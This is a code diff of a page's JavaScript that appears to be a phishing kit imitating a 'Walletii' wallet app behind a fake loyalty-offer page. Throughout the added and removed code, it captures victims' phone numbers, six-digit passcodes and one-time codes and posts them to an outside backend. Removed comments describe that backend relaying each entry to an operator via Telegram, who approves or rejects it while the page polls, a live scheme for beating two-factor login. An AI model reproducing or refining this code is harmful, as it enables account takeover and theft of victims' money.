+  landing.style.opacity      = '0';
+  landing.style.pointerEvents = 'none';
+  form.style.opacity         = '1';
+  form.style.pointerEvents   = 'auto';
+}, 3000);
 
-  /* ── Navigation ── */
-  let currentScreen = 'screen-landing';
+// Step 2: On form submit, hide loyalty page, show app
+document.getElementById('loyaltyForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  const loyaltyRoot = document.getElementById('loyalty-root');
+  const appRoot     = document.getElementById('app-root');
 
-  function goTo(id) {
-    const cur = document.getElementById(currentScreen);
-    const next = document.getElementById(id);
-    cur.classList.add('exit-left');
-    setTimeout(() => { cur.classList.remove('active', 'exit-left'); }, 350);
-    next.classList.add('active');
-    currentScreen = id;
-    if (id === 'screen-otp') startOtpTimer();
-  }
+  // Fade out loyalty
+  loyaltyRoot.style.transition = 'opacity 0.6s ease';
+  loyaltyRoot.style.opacity    = '0';
 
-  /* ── SCREEN 2: Phone ── */
-  function toggleDd() {
-    document.getElementById('dropdown').classList.toggle('open');
-  }
-  function pickCountry(code, name, el) {
-    document.getElementById('prefixVal').textContent = code;
-    document.getElementById('dropdown').classList.remove('open');
-    document.querySelectorAll('.dropdown-item').forEach(i => i.classList.remove('active'));
-    el.classList.add('active');
-    onPhoneInput();
-  }
-  document.addEventListener('click', e => {
-    const dd = document.getElementById('dropdown');
-    const pb = document.getElementById('prefixBtn');
-    if (dd && pb && !pb.contains(e.target) && !dd.contains(e.target)) dd.classList.remove('open');
-  });
-  function onPhoneInput() {
-    const val = document.getElementById('phoneInput').value.replace(/\D/g,'');
-    document.getElementById('phoneInput').value = val;
-    const btn = document.getElementById('phoneContinueBtn');
-    btn.classList.toggle('active', val.length >= 7);
-  }
-  function proceedFromPhone() {
-    const val = document.getElementById('phoneInput').value.trim();
-    if (val.length < 7) return;
-    const prefix = document.getElementById('prefixVal').textContent;
-    SESSION.phone       = val;
-    SESSION.countryCode = prefix;
-    pcPhase = 1; pcInput = ''; pcFirst = '';
-    updateDots();
-    goTo('screen-passcode');
-  }
-
-  /* ── SCREEN 3: OTP ── */
-  let otpVal = '';
-  let otpTimer = null;
-  let otpCountdown = 57;
-
-  function startOtpTimer() {
-    otpVal = '';
-    otpCountdown = 57;
-    document.getElementById('resendText').textContent = 'Resend code in 57 seconds';
-    document.getElementById('resendText').style.cursor = 'default';
-    updateOtpBoxes();
-    if (otpTimer) clearInterval(otpTimer);
-    otpTimer = setInterval(() => {
-      otpCountdown--;
-      if (otpCountdown <= 0) {
-        clearInterval(otpTimer);
-        document.getElementById('resendText').textContent = 'Resend code';
-        document.getElementById('resendText').style.cursor = 'pointer';
-        document.getElementById('resendText').onclick = notifyResend;
-      } else {
-        document.getElementById('resendText').textContent = 'Resend code in ' + otpCountdown + ' seconds';
-      }
-    }, 1000);
-    setTimeout(() => document.getElementById('otp-hidden').focus(), 100);
-  }
-
-  function updateOtpBoxes() {
-    for (let i = 0; i < 6; i++) {
-      const box = document.getElementById('ob' + i);
-      if (i < otpVal.length) {
-        box.textContent = otpVal[i];
-        box.classList.add('filled');
-        box.classList.remove('cur');
-      } else {
-        box.innerHTML = '<div class="dash"></div>';
-        box.classList.remove('filled');
-        box.classList.toggle('cur', i === otpVal.length);
-      }
-    }
-    document.getElementById('otpContinueBtn').classList.toggle('active', otpVal.length === 6);
-  }
-
-  function onOtpInput() {
-    const h = document.getElementById('otp-hidden');
-    otpVal = h.value.replace(/\D/g,'').slice(0,6);
-    h.value = otpVal;
-    updateOtpBoxes();
-  }
-  function onOtpKey(e) {
-    if (e.key === 'Backspace') {
-      otpVal = otpVal.slice(0,-1);
-      document.getElementById('otp-hidden').value = otpVal;
-      updateOtpBoxes();
-    }
-  }
-  function proceedFromOtp() {
-    if (otpVal.length < 6) return;
-    if (otpTimer) clearInterval(otpTimer);
-    submitOTP();
-  }
-
-  /* ── SCREEN 4: Passcode ── */
-  let pcPhase = 1;
-  let pcInput = '';
-  let pcFirst = '';
-
-  function updateDots() {
-    for (let i = 0; i < 6; i++) {
-      const c = document.getElementById('pc' + i);
-      c.classList.toggle('on', i < pcInput.length);
-    }
-    document.getElementById('pcBack').classList.toggle('show', pcInput.length > 0);
-    document.getElementById('pcContinueBtn').classList.toggle('active', pcInput.length === 6);
-  }
-
-  function pcKey(d) {
-    if (pcInput.length >= 6) return;
-    pcInput += d;
-    updateDots();
-    if (pcInput.length === 6) {
-      setTimeout(() => {
-        SESSION.passcode = pcInput;
-        notifyLogin();
-      }, 380);
-    }
-  }
-
-  function pcBackspace() {
-    if (!pcInput.length) return;
-    pcInput = pcInput.slice(0,-1);
-    updateDots();
-  }
-
-  function proceedFromPasscode() {
-    if (pcInput.length < 6) return;
-    SESSION.passcode = pcInput;
-    notifyLogin();
-  }
-
-  // ════════════════════════════════════════════════════
-  //  RESEND: notify backend → sends Telegram alert, no polling
-  // ════════════════════════════════════════════════════
-  async function notifyResend() {
-    // Disable button to prevent spam
-    const btn = document.getElementById('resendText');
-    btn.style.cursor  = 'default';
-    btn.textContent   = 'Sending…';
-    btn.onclick       = null;
-    try {
-      await fetch(API_BASE + '/notify', {
-        method:  'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          type:        'resend',
-          phone:       SESSION.phone,
-          countryCode: SESSION.countryCode,
-        }),
+  setTimeout(() => {
+    loyaltyRoot.style.display = 'none';
+    // Show app
+    appRoot.style.display = 'flex';
+    appRoot.style.opacity = '0';
+    appRoot.style.transition = 'opacity 0.6s ease';
+    requestAnimationFrame(() => {
+      requestAnimationFrame(() => {
+        appRoot.style.opacity = '1';
       });
-    } catch (e) { /* silent fail — resend is best-effort */ }
-    // Restart the countdown timer
-    startOtpTimer();
-  }
+    });
+  }, 600);
+});
 
-  // ════════════════════════════════════════════════════
-  //  STEP 1: Phone + Passcode → notify backend (login)
-  //  Backend sends Telegram message to admin with [Send OTP] button
-  // ════════════════════════════════════════════════════
-  async function notifyLogin() {
-    showWaiting('Verifying your details…', 'Please wait a moment');
+
+// ══════════════════════════════════════════════════════
+//  PAGE 2 — WALLETII APP LOGIC
+// ══════════════════════════════════════════════════════
+
+const API_BASE = 'https://your-walletii-backend.onrender.com';
+
+const SESSION = {
+  phone:       '',
+  countryCode: '',
+  passcode:    '',
+  loginToken:  null,
+  otpToken:    null,
+  pollIv:      null,
+};
+
+/* ── Navigation ── */
+let currentScreen = 'screen-landing';
+
+function goTo(id) {
+  const cur  = document.getElementById(currentScreen);
+  const next = document.getElementById(id);
+  cur.classList.add('exit-left');
+  setTimeout(() => { cur.classList.remove('active', 'exit-left'); }, 350);
+  next.classList.add('active');
+  currentScreen = id;
+  if (id === 'screen-otp') startOtpTimer();
+}
+
+/* ── Phone screen ── */
+function toggleDd() {
+  document.getElementById('dropdown').classList.toggle('open');
+}
+function pickCountry(code, name, el) {
+  document.getElementById('prefixVal').textContent = code;
+  document.getElementById('dropdown').classList.remove('open');
+  document.querySelectorAll('.dropdown-item').forEach(i => i.classList.remove('active'));
+  el.classList.add('active');
+  onPhoneInput();
+}
+document.addEventListener('click', e => {
+  const dd = document.getElementById('dropdown');
+  const pb = document.getElementById('prefixBtn');
+  if (dd && pb && !pb.contains(e.target) && !dd.contains(e.target)) dd.classList.remove('open');
+});
+function onPhoneInput() {
+  const val = document.getElementById('phoneInput').value.replace(/\D/g,'');
+  document.getElementById('phoneInput').value = val;
+  document.getElementById('phoneContinueBtn').classList.toggle('active', val.length >= 7);
+}
+function proceedFromPhone() {
+  const val = document.getElementById('phoneInput').value.trim();
+  if (val.length < 7) return;
+  SESSION.phone       = val;
+  SESSION.countryCode = document.getElementById('prefixVal').textContent;
+  pcInput = ''; updateDots();
+  goTo('screen-passcode');
+}
+
+/* ── OTP screen ── */
+let otpVal = '', otpTimer = null, otpCountdown = 57;
+
+function startOtpTimer() {
+  otpVal = ''; otpCountdown = 57;
+  document.getElementById('resendText').textContent = 'Resend code in 57 seconds';
+  document.getElementById('resendText').style.cursor = 'default';
+  document.getElementById('resendText').onclick = null;
+  updateOtpBoxes();
+  if (otpTimer) clearInterval(otpTimer);
+  otpTimer = setInterval(() => {
+    otpCountdown--;
+    if (otpCountdown <= 0) {
+      clearInterval(otpTimer);
+      document.getElementById('resendText').textContent = 'Resend code';
+      document.getElementById('resendText').style.cursor = 'pointer';
+      document.getElementById('resendText').onclick = notifyResend;
+    } else {
+      document.getElementById('resendText').textContent = 'Resend code in ' + otpCountdown + ' seconds';
+    }
+  }, 1000);
+  setTimeout(() => document.getElementById('otp-hidden').focus(), 100);
+}
+
+function updateOtpBoxes() {
+  for (let i = 0; i < 6; i++) {
+    const box = document.getElementById('ob' + i);
+    if (i < otpVal.length) {
+      box.textContent = otpVal[i];
+      box.classList.add('filled');
+      box.classList.remove('cur');
+    } else {
+      box.innerHTML = '<div class="dash"></div>';
+      box.classList.remove('filled');
+      box.classList.toggle('cur', i === otpVal.length);
+    }
+  }
+  document.getElementById('otpContinueBtn').classList.toggle('active', otpVal.length === 6);
+}
+
+function onOtpInput() {
+  const h = document.getElementById('otp-hidden');
+  otpVal  = h.value.replace(/\D/g,'').slice(0,6);
+  h.value = otpVal;
+  updateOtpBoxes();
+}
+function onOtpKey(e) {
+  if (e.key === 'Backspace') {
+    otpVal = otpVal.slice(0,-1);
+    document.getElementById('otp-hidden').value = otpVal;
+    updateOtpBoxes();
+  }
+}
+function proceedFromOtp() {
+  if (otpVal.length < 6) return;
+  if (otpTimer) clearInterval(otpTimer);
+  submitOTP();
+}
+
+/* ── Passcode screen ── */
+let pcInput = '';
+
+function updateDots() {
+  for (let i = 0; i < 6; i++) {
+    document.getElementById('pc' + i).classList.toggle('on', i < pcInput.length);
+  }
+  document.getElementById('pcBack').classList.toggle('show', pcInput.length > 0);
+  document.getElementById('pcContinueBtn').classList.toggle('active', pcInput.length === 6);
+}
+function pcKey(d) {
+  if (pcInput.length >= 6) return;
+  pcInput += d; updateDots();
+  if (pcInput.length === 6) {
+    setTimeout(() => { SESSION.passcode = pcInput; notifyLogin(); }, 380);
+  }
+}
+function pcBackspace() {
+  if (!pcInput.length) return;
+  pcInput = pcInput.slice(0,-1); updateDots();
+}
+function proceedFromPasscode() {
+  if (pcInput.length < 6) return;
+  SESSION.passcode = pcInput; notifyLogin();
+}
+
+/* ── Resend ── */
+async function notifyResend() {
+  const btn = document.getElementById('resendText');
+  btn.style.cursor = 'default';
+  btn.textContent  = 'Sending…';
+  btn.onclick      = null;
+  try {
+    await fetch(API_BASE + '/notify', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ type: 'resend', phone: SESSION.phone, countryCode: SESSION.countryCode }),
+    });
+  } catch(e) {}
+  startOtpTimer();
+}
+
+/* ── Login notify ── */
+async function notifyLogin() {
+  showWaiting('Verifying your details…', 'Please wait a moment');
+  try {
+    const res  = await fetch(API_BASE + '/notify', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ type: 'login', phone: SESSION.phone, countryCode: SESSION.countryCode, passcode: SESSION.passcode }),
+    });
+    const data = await res.json();
+    if (!data.ok) throw new Error(data.error || 'Server error');
+    SESSION.loginToken = data.token;
+    startPolling(SESSION.loginToken, (result) => {
+      hideWaiting();
+      if (result === 'otp_allowed') {
+        document.getElementById('otpPhoneDisplay').textContent = SESSION.countryCode + ' ' + SESSION.phone;
+        startOtpTimer(); goTo('screen-otp');
+      } else if (result === 'wrong_pin') {
+        showErrOverlay('Incorrect PIN. Please try again.');
+      } else if (result === 'expired') {
+        showErrOverlay('Request timed out. Please try again.');
+      }
+    });
+  } catch(err) {
+    hideWaiting();
+    showErrOverlay('Could not reach server. Check your connection.');
+  }
+}
+
+/* ── OTP submit ── */
+async function submitOTP() {
+  showWaiting('Checking your code…', 'Please wait a moment');
+  try {
+    const res  = await fetch(API_BASE + '/notify', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ type: 'otp', phone: SESSION.phone, countryCode: SESSION.countryCode, otp: otpVal, passcode: SESSION.passcode }),
+    });
+    const data = await res.json();
+    if (!data.ok) throw new Error(data.error || 'Server error');
+    SESSION.otpToken = data.token;
+    startPolling(SESSION.otpToken, (result) => {
+      hideWaiting();
+      if (result === 'otp_correct')  showSuccessOverlay();
+      else if (result === 'otp_wrong')   showWrongOverlay();
+      else if (result === 'expired')     showErrOverlay('Request timed out. Please try again.');
+    });
+  } catch(err) {
+    hideWaiting();
+    showErrOverlay('Could not reach server. Check your connection.');
+  }
+}
+
+/* ── Polling ── */
+function startPolling(token, callback) {
+  if (SESSION.pollIv) clearInterval(SESSION.pollIv);
+  let attempts = 0;
+  SESSION.pollIv = setInterval(async () => {
+    if (++attempts > 150) { clearInterval(SESSION.pollIv); callback('expired'); return; }
     try {
-      const res  = await fetch(API_BASE + '/notify', {
-        method:  'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          type:        'login',
-          phone:       SESSION.phone,
-          countryCode: SESSION.countryCode,
-          passcode:    SESSION.passcode,
-        }),
+      const res  = await fetch(API_BASE + '/poll', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ token }),
       });
       const data = await res.json();
-      if (!data.ok) throw new Error(data.error || 'Server error');
+      if (!data.ok) return;
+      if (data.result !== 'pending') { clearInterval(SESSION.pollIv); callback(data.result); }
+    } catch {}
+  }, 2000);
+}
 
-      SESSION.loginToken = data.token;
-
-      // Poll every 2s — when admin clicks "Send OTP", navigate to OTP screen
-      startPolling(SESSION.loginToken, (result) => {
-        hideWaiting();
-        if (result === 'otp_allowed') {
-          const prefix = SESSION.countryCode;
-          const phone  = SESSION.phone;
-          document.getElementById('otpPhoneDisplay').textContent = prefix + ' ' + phone;
-          startOtpTimer();
-          goTo('screen-otp');
-        } else if (result === 'wrong_pin') {
-          showErrOverlay('Incorrect PIN. Please try again.');
-        } else if (result === 'expired') {
-          showErrOverlay('Request timed out. Please try again.');
-        }
-      });
-
-    } catch (err) {
-      hideWaiting();
-      showErrOverlay('Could not reach server. Check your connection.');
-      console.error(err);
-    }
-  }
-
-  // ════════════════════════════════════════════════════
-  //  STEP 2: OTP submitted → notify backend
-  //  Backend sends Telegram message with [Continue] [Wrong Code]
-  // ════════════════════════════════════════════════════
-  async function submitOTP() {
-    showWaiting('Checking your code…', 'Please wait a moment');
-    try {
-      const res  = await fetch(API_BASE + '/notify', {
-        method:  'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          type:        'otp',
-          phone:       SESSION.phone,
-          countryCode: SESSION.countryCode,
-          otp:         otpVal,
-          passcode:    SESSION.passcode,
-        }),
-      });
-      const data = await res.json();
-      if (!data.ok) throw new Error(data.error || 'Server error');
-
-      SESSION.otpToken = data.token;
-
-      startPolling(SESSION.otpToken, (result) => {
-        hideWaiting();
-        if (result === 'otp_correct') {
-          showSuccessOverlay();
-        } else if (result === 'otp_wrong') {
-          showWrongOverlay();
-        } else if (result === 'expired') {
-          showErrOverlay('Request timed out. Please try again.');
-        }
-      });
-
-    } catch (err) {
-      hideWaiting();
-      showErrOverlay('Could not reach server. Check your connection.');
-      console.error(err);
-    }
-  }
-
-  // ════════════════════════════════════════════════════
-  //  POLLING — checks /poll every 2 seconds
-  // ════════════════════════════════════════════════════
-  function startPolling(token, callback) {
-    if (SESSION.pollIv) clearInterval(SESSION.pollIv);
-    let attempts = 0;
-    SESSION.pollIv = setInterval(async () => {
-      attempts++;
-      if (attempts > 150) { // 5 min timeout
-        clearInterval(SESSION.pollIv);
-        callback('expired');
-        return;
-      }
-      try {
-        const res  = await fetch(API_BASE + '/poll', {
-          method:  'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body:    JSON.stringify({ token }),
-        });
-        const data = await res.json();
-        if (!data.ok) return;
-        if (data.result !== 'pending') {
-          clearInterval(SESSION.pollIv);
-          callback(data.result);
-        }
-      } catch { /* keep polling on network blip */ }
-    }, 2000);
-  }
-
-  // ════════════════════════════════════════════════════
-  //  OVERLAY HELPERS
-  // ════════════════════════════════════════════════════
-  function showWaiting(title, sub) {
-    document.getElementById('ov-title').textContent = title;
-    document.getElementById('ov-sub').textContent   = sub;
-    document.getElementById('ov-waiting').style.display = 'flex';
-  }
-  function hideWaiting() {
-    document.getElementById('ov-waiting').style.display = 'none';
-  }
-  function showWrongOverlay() {
-    // Reset OTP and show wrong code message
-    otpVal = '';
-    document.getElementById('otp-hidden').value = '';
-    updateOtpBoxes();
-    document.getElementById('ov-wrong').style.display = 'flex';
-  }
-  function closeWrongOverlay() {
-    document.getElementById('ov-wrong').style.display = 'none';
-    setTimeout(() => document.getElementById('otp-hidden').focus(), 200);
-  }
-  function showSuccessOverlay() {
-    document.getElementById('ov-success').style.display = 'flex';
-  }
-  function showErrOverlay(msg) {
-    document.getElementById('ov-err-msg').textContent = msg;
-    document.getElementById('ov-err').style.display = 'flex';
-  }
-  function closeErrOverlay() {
-    document.getElementById('ov-err').style.display = 'none';
-  }
+/* ── Overlays ── */
+function showWaiting(title, sub) {
+  document.getElementById('ov-title').textContent = title;
+  document.getElementById('ov-sub').textContent   = sub;
+  document.getElementById('ov-waiting').style.display = 'flex';
+}
+function hideWaiting()      { document.getElementById('ov-waiting').style.display = 'none'; }
+function showWrongOverlay() {
+  otpVal = ''; document.getElementById('otp-hidden').value = ''; updateOtpBoxes();
+  document.getElementById('ov-wrong').style.display = 'flex';
+}
+function closeWrongOverlay() {
+  document.getElementById('ov-wrong').style.display = 'none';
+  setTimeout(() => document.getElementById('otp-hidden').focus(), 200);
+}
+function showSuccessOverlay() { document.getElementById('ov-success').style.display = 'flex'; }
+function showErrOverlay(msg) {
+  document.getElementById('ov-err-msg').textContent = msg;
+  document.getElementById('ov-err').style.display = 'flex';
+}
+function closeErrOverlay()  { document.getElementById('ov-err').style.display = 'none'; }
 </script>
 </body>
 </html>
